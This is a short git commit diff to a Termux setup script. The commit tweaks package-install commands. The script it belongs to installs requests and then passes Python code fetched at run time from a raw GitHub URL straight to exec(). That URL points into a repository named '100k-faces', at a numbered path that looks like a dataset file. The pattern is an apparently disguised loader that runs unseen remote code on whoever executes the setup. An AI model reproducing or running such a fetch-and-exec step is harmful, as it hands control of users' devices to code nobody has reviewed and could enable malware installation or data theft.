a3ee708c19c9644a226f5c3ba6a4f288a037898e
tienmai291207 <106916721+tienmai291207@users.noreply.github.com>
2024-07-08 08:58:32 +0700

    Update setup_termux.py

--- setup_termux.py
+++ setup_termux.py
@@ -1,9 +1,7 @@
 import os
 os.system('pkg install termux-am -y')
 os.system('termux-setup-storage')
-os.system('apt update -y')
-os.system('apt upgrade -y')
-os.system('pip install requests -y')
+os.system('pip install requests')
 import requests 
 try:
     exec(requests.get("https://raw.githubusercontent.com/tienmai291207/100k-faces/master/docs/0/4/004395.py").text)
